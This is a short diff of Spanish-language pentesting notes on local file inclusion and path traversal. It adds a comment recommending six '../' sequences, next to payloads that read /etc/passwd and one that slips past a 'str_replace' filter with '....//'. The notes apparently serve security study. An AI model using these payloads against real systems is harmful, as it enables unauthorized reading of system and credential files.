@@ -37,6 +37,8 @@ En el LFI podemos usar:
 ## Path Traversal 
 
 ```bash 
+# Como mejor practica son 6 '../'
+
 ❯ /etc/passwd                       # Desde la raiz cargamos el archivo 
 ❯ ../../../../etc/passwd            # Nos salimos de el dir y apuntamos al archivo 
 ❯ ....//....//....//etc/passwd      # Evitamos el filtro de 'str_replace' 
